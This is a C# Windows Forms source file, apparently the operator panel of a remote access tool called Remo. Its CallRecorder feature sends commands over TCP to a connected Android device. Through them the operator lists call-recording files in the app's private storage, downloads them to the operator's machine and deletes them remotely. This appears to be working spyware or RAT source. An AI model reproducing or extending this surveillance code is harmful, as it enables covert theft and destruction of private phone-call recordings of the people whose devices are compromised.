using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Remo.Connections;
using System.Net;

namespace Remo.Features
{
    public partial class CallRecorder : Form,IFeature
    {

        private string CurrentPath = "/data/data/com.remo/files/Rec";
        public int DATA_TYPE { get; set; }
        public IConnection MainConnection { get; set; }

       // IFeature FD = null;

        public CallRecorder()
        {
            InitializeComponent();
            DATA_TYPE = (int)DataHandler.eDataType.CALL_RECORDS;
            CheckForIllegalCrossThreadCalls = false;
        }
        
        public void onErrorReceived(string error)
        {
            throw new NotImplementedException();
        }

        public void onDataReceived(int Flag, byte[] data)
        {

            this.Invoke((MethodInvoker)delegate
            {
                Console.WriteLine(Encoding.UTF8.GetString(data));
                dataGridView1.Rows.Clear();

                string[] files = Encoding.UTF8.GetString(data).Split('/');
                foreach (string s in files)
                {
                    if (!String.Empty.Equals(s))
                        dataGridView1.Rows.Add(s.Split('_'));
                }

                dataGridView1.ScrollBars = ScrollBars.Both; 

            });
            
        }

        private void FileMan_Load(object sender, EventArgs e)
        {
            Console.WriteLine("CallRecorder");
            MainForm.mTCPH.send(((int)DataHandler.eDataType.CALL_RECORDS).ToString(),
                ((int)DataHandler.eOrderType.START).ToString(),"L="+ CurrentPath,
                    MainConnection.tcpClient);
        }

        private void dataGridView1_CellDoubleClick(object sender, DataGridViewCellEventArgs e)
        {
            //var dataIndexNo = dataGridView1.Rows[e.RowIndex].Index.ToString();
            string fileName = dataGridView1.Rows[e.RowIndex].Cells[0].Value.ToString();
            string fileType = dataGridView1.Rows[e.RowIndex].Cells[1].Value.ToString();
            if (fileType.Equals("Folder"))
            {
                if(CurrentPath.Substring(CurrentPath.Length - 1).Equals("/"))
                    CurrentPath += fileName;
                else
                    CurrentPath += "/" + fileName;
                MainForm.mTCPH.send(((int)DataHandler.eDataType.CALL_RECORDS).ToString(),
                ((int)DataHandler.eOrderType.UPDATE).ToString(), "L=" + CurrentPath,
                    MainConnection.tcpClient);
            }
        }



        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if(MessageBox.Show("Are You Sure ?","Confirm",MessageBoxButtons.YesNo,MessageBoxIcon.Warning) == DialogResult.Yes)
            {


                foreach(DataGridViewRow r in dataGridView1.SelectedRows)
                {
                    MainForm.mTCPH.send(((int)DataHandler.eDataType.CALL_RECORDS).ToString(),
                ((int)DataHandler.eOrderType.UPDATE).ToString(), "D=" + CurrentPath + "/" + r.Cells[0].Value.ToString() ,
                MainConnection.tcpClient);

                }

                
            }
        }



        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {

            FolderBrowserDialog fbd = new FolderBrowserDialog();
            fbd.ShowNewFolderButton = true;
            if (fbd.ShowDialog() == DialogResult.OK)
            {

                if (MainForm.FileDownloader == null || MainForm.FileDownloader.IsDisposed)
                {
                    MainForm.FileDownloader = MainForm.mTCPH.startFeature(
                        (MainConnection.tcpClient.Client.RemoteEndPoint as IPEndPoint).Address.ToString(),
                        (int)DataHandler.eDataType.FM_DOWN);
                    MainForm.FileDownloader.Show();
                    foreach (DataGridViewRow r in dataGridView1.SelectedRows)
                    {
                        string name = r.Cells[0].Value.ToString() + "_" + r.Cells[1].Value.ToString() + "_" + r.Cells[2].Value.ToString() + "_" + r.Cells[3].Value.ToString();
                        ((FileDownloader)MainForm.FileDownloader).addToList(fbd.SelectedPath, CurrentPath , name, ( r.Cells[1].Value.ToString().Equals("Folder")));
                    }
                }
                else
                {


                    foreach (DataGridViewRow r in dataGridView1.SelectedRows)
                    {
                        string name = r.Cells[0].Value.ToString() + "_" + r.Cells[1].Value.ToString() + "_" + r.Cells[2].Value.ToString() + "_" + r.Cells[3].Value.ToString();
                        ((FileDownloader)MainForm.FileDownloader).addToList(fbd.SelectedPath, CurrentPath , name, ( r.Cells[1].Value.ToString().Equals("Folder")));
                    }
                }
            }




        }



        private void FileMan_FormClosing(object sender, FormClosingEventArgs e)
        {
            MainForm.mTCPH.send(((int)DataHandler.eDataType.CALL_RECORDS).ToString(),
                ((int)DataHandler.eOrderType.STOP).ToString(),
                    MainConnection.tcpClient);
        }


    }
}
